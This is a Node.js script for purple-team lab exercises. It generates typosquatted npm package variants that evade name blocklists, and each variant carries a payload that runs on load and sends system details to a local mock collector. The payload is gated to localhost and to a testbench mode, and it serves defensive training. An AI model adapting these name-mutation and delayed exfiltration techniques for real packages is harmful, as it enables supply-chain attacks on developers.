#!/usr/bin/env node
/**
 * Polymorphic attacker for purple-team reversal rounds.
 *
 * A static name blocklist stops the exact package the learner saw. Real
 * attackers republish under a new name and reshape the payload. This script
 * plays that attacker: from a seed it picks a new package name, a delivery
 * timing and a wire format, then writes a small self-contained package the
 * victim's variant entry can require.
 *
 *   node polymorphic-variant.js --base request-lib --port 3000 --out DIR [--seed N]
 *
 * It writes DIR/node_modules/<mutated-name>/{package.json,index.js} and prints
 * one JSON line describing the mutation.
 *
 * Safety (same rules as every lab payload):
 * - the generated payload does nothing unless TESTBENCH_MODE === 'enabled'
 * - it only ever connects to 127.0.0.1 on the numeric port you pass in
 * - the package is written only under --out, which the control plane keeps
 *   inside the lab's victim directory
 */
const fs = require('fs');
const path = require('path');

function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i += 1) {
    if (argv[i].startsWith('--')) out[argv[i].slice(2)] = argv[i + 1];
  }
  return out;
}

/** Small deterministic PRNG so a seed reproduces the same mutation. */
function rng(seed) {
  let a = (Number(seed) >>> 0) || 1; // mulberry32
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function pick(rand, list) {
  return list[Math.floor(rand() * list.length)];
}

function nameMutations(base) {
  const [head, tail] = base.includes('-') ? base.split('-') : [base, ''];
  const swapped = base.replace(/([a-z])([a-z])/, (_m, a, b) => `${b}${a}`);
  const out = [
    { kind: 'drop-separator', name: base.replace(/-/g, '') },
    { kind: 'suffix', name: `${base}-ng` },
    { kind: 'suffix', name: `${base}2` },
    { kind: 'prefix', name: `node-${base}` },
    { kind: 'plural-swap', name: `${head}s${tail ? `-${tail}` : ''}x` },
    { kind: 'transposition', name: swapped },
    { kind: 'digit-lookalike', name: base.replace(/l/g, '1') },
  ];
  return out.filter((c) => c.name && c.name !== base && /^[a-z0-9][a-z0-9._-]*$/.test(c.name));
}

function buildSource({ name, port, delivery, delayMs, encoding, field }) {
  const sendBody =
    encoding === 'base64'
      ? `{ v: 2, ${JSON.stringify(field)}: Buffer.from(JSON.stringify(record)).toString('base64') }`
      : `Object.assign({}, record, { ${JSON.stringify(field)}: 'plain' })`;
  const launch =
    delivery === 'timer'
      ? `setTimeout(run, ${delayMs});`
      : delivery === 'tick'
        ? 'process.nextTick(run);'
        : 'run();';
  return `'use strict';
// SCAS polymorphic variant. Educational, localhost only.
const http = require('http');

function run() {
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    console.log('[SAFE MODE] Malicious behavior prevented - not in testbench');
    return;
  }
  try {
    const record = {
      timestamp: new Date().toISOString(),
      package: { name: ${JSON.stringify(name)}, variant: true },
      system: { platform: process.platform, nodeVersion: process.version, cwd: process.cwd() },
    };
    const payload = JSON.stringify(${sendBody});
    const req = http.request({
      hostname: '127.0.0.1',
      port: ${port},
      path: '/collect',
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
    }, () => console.log('[TESTBENCH] variant exfiltration simulated (sent to mock server)'));
    req.on('error', (e) => console.log('[TESTBENCH] Mock server not available:', e.message));
    req.write(payload);
    req.end();
  } catch (e) {
    console.log('[TESTBENCH] variant payload failed:', e.code || e.message);
  }
}

${launch}

module.exports = { get: async () => ({ statusCode: 200, body: '' }) };
`;
}

function main() {
  const args = parseArgs(process.argv.slice(2));
  const base = String(args.base || '');
  const port = Number(args.port);
  const outDir = args.out ? path.resolve(args.out) : '';
  if (!/^[a-z0-9][a-z0-9._-]*$/.test(base)) throw new Error('--base must be a plain npm package name');
  if (!Number.isInteger(port) || port < 1 || port > 65535) throw new Error('--port must be a port number');
  if (!outDir) throw new Error('--out is required');

  const seed = args.seed !== undefined ? Number(args.seed) >>> 0 : (Date.now() ^ (process.pid << 8)) >>> 0;
  const rand = rng(seed);
  const mutation = pick(rand, nameMutations(base));
  const delivery = pick(rand, ['sync', 'timer', 'tick']);
  const delayMs = delivery === 'timer' ? 120 + Math.floor(rand() * 280) : 0;
  const encoding = pick(rand, ['plain', 'base64']);
  const field = pick(rand, ['meta', 'blob', 'telemetry', 'diag']);

  const pkgDir = path.join(outDir, 'node_modules', mutation.name);
  fs.rmSync(outDir, { recursive: true, force: true });
  fs.mkdirSync(pkgDir, { recursive: true });
  fs.writeFileSync(
    path.join(pkgDir, 'package.json'),
    `${JSON.stringify(
      {
        name: mutation.name,
        version: '1.0.1',
        description: 'Polymorphic variant [MALICIOUS - EDUCATIONAL ONLY]',
        main: 'index.js',
        license: 'MIT',
      },
      null,
      2,
    )}\n`,
  );
  fs.writeFileSync(
    path.join(pkgDir, 'index.js'),
    buildSource({ name: mutation.name, port, delivery, delayMs, encoding, field }),
  );

  process.stdout.write(
    `${JSON.stringify({
      packageName: mutation.name,
      mutation: mutation.kind,
      delivery,
      delayMs,
      encoding,
      field,
      seed,
      nodePath: path.join(outDir, 'node_modules'),
    })}\n`,
  );
}

try {
  main();
} catch (err) {
  process.stderr.write(`[polymorphic-variant] ${err.message}\n`);
  process.exit(1);
}
